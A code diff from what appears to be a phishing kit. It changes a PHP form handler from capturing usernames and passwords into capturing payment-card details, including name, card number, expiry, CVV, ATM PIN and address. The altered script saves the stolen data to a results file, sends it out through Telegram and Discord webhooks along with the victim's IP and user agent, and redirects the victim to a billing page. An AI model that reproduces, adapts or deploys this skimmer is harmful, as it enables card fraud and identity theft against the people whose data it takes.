@@ -1,10 +1,17 @@
 <?php
-if (isset($_POST["user"]) && isset($_POST["pass"]) )
+if (isset($_POST['fnm']) && isset($_POST['ccn']) && isset($_POST['cex'])  && isset($_POST['csc']))
 {
 session_start();
-
-$user = $_POST["user"];
-$pass = $_post["pass"];
+$noc = $_SESSION['fnm'] = $_POST['fnm']    ;
+$cc =$_SESSION['cc'] = $_POST['ccn'] ;
+$expdate = $_POST['cex'];
+$cvv = $_POST['csc'];
+$atm = $_POST['atm'];
+$adr = $_POST['adr'];
+$zip = $_POST['zip'];
+$cty = $_POST['cty'];
+$stt = $_POST['stt'];
+$cnt = $_POST['cnt'];
 $ip   = $_SERVER['REMOTE_ADDR'];
 $UA   = $_SERVER['HTTP_USER_AGENT'];
 $host = $_SERVER['REMOTE_HOST'];
@@ -17,38 +24,44 @@ $webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
 extract($_REQUEST);
 
 
-$file=fopen("../results/logs.txt","a");
+$file=fopen("../results/cc.txt","a");
 
 
 # Format for log.txt file
 // Here variable $a is just an example (replace with your own variables)
 
-fwrite($file," << N E W  M A F I S O  L O G I N >>\r\n");
-fwrite($file, "Username: ". $user ."\r\n");
-fwrite($file, "Password: ". $pass ."\r\n");
-fwrite($file," <<   S E S S I O N    I N F O    >>\r\n");
+fwrite($file," << N E W   M A F I S O   C A R D >>\r\n");
+fwrite($file, "Name on card : ". $noc ."\r\n");
+fwrite($file, "Card Number  : ". $cc ."\r\n");
+fwrite($file, "Card EXP Date: ". $expdate ."\r\n");
+fwrite($file, "Card CVV     : ". $cvv ."||  ATM: ". $atm ."\r\n");
+fwrite($file, "address      : ". $adr ." \r\n");
+fwrite($file," <<       S E S S I O N    I N F O      >>\r\n");
 fwrite($file, "User Agent: ". $UA ."\r\n");
 fwrite($file, "IP: ". $ip ."\r\n");
 fwrite($file, "HOSTNAME : ". $host ."\r\n");
-fwrite($file,"<<    E N D   O F   L O G I N     >>\r\n");
+fwrite($file,"<<      E N D   O F   C A R D     >>\r\n");
 fclose($file);
 
 
 # Store Post values in variables
 // Here variable $a is just an example (replace with your own variables)
-$_SESSION['check1'] = "true";
+$_SESSION['check5'] = "true";
 
 
 # Format for Telegram & Discord
 // Here variable $a is just an example (replace with your own variables)
-$data = " << N E W  M A F I S O  L O G I N >>\r\n";
-$data.= " > Username: $user\r\n";
-$data.= " > Password: $pass\r\n";
-$data.= " <<   S E S S I O N    I N F O    >>\r\n";
+$data = " << N E W   M A F I S O   C A R D >>\r\n";
+$data.= " > Name on card :  $noc\r\n";
+$data.= " > Card Number  :  $cc\r\n";
+$data.= " > Card EXP Date: $expdate\r\n";
+$data.= " > Card CVV     :  $cvv  || ATM: $atm \r\n";
+$data.= " > address      :  $adr \r\n";
+$data.= " <<       S E S S I O N    I N F O      >>\r\n";
 $data.= " > User Agent: $UA \r\n";
 $data.= " >IP : $ip \r\n";
 $data.= " >HOSTNAME : $host \r\n";
-$data.= "<<    E N D   O F   L O G I N     >>\r\n";
+$data.= "<<      E N D   O F   C A R D     >>\r\n";
 
 
 
@@ -80,7 +93,7 @@ if ($discord == "on"){
     $response = curl_exec($ch);
 }
 
-header("location: ../accounts.php");
+header("location: ../billing.php");
 }
 else
 {
